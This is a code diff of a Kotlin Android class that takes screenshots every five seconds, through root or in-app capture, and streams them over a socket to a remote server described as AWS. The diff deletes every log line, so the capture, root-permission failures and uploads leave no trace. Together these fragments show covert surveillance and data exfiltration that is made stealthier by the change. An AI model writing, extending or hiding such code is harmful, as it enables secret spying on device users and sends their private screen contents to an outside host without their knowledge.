@@ -48,7 +48,6 @@ class carne(private val context: Context, private val activity: Activity? = null
                     // Fallback to in-app capture if root is not available but activity is provided
                     captureInApp(activity)
                 } else {
-                    Log.e("ScreenshotTest", "Root not available and no activity provided. Cannot capture screenshots.")
                 }
             }
         }, 0, 5, TimeUnit.SECONDS)
@@ -115,14 +114,9 @@ class carne(private val context: Context, private val activity: Activity? = null
                     processBitmap(bitmap)
                     bitmap.recycle()
                 } else {
-                    Log.e("ScreenshotTest", "Failed to decode bitmap from root capture")
                 }
             }
         } catch (e: Exception) {
-            Log.e("ScreenshotTest", "Root capture failed: ${e.message}")
-            if (e.message?.contains("Permission denied") == true) {
-                Log.e("ScreenshotTest", "Root access was denied. Please grant root permission to the app.")
-            }
         }
     }
 
@@ -147,7 +141,6 @@ class carne(private val context: Context, private val activity: Activity? = null
             while (isRunning) {
                 var socket: Socket? = null
                 try {
-                    Log.d("ScreenshotTest", "Forwarding: Connecting to AWS $remoteIp:$remotePort...")
                     socket = Socket(remoteIp, remotePort)
                     val outputStream = socket.getOutputStream()
 
@@ -174,7 +167,6 @@ class carne(private val context: Context, private val activity: Activity? = null
                         }
                     }
                 } catch (e: Exception) {
-                    Log.e("ScreenshotTest", "Forwarding Failed: ${e.message}. Retrying in 10s...")
                     Thread.sleep(10000)
                 } finally {
                     try { socket?.close() } catch (ex: Exception) {}
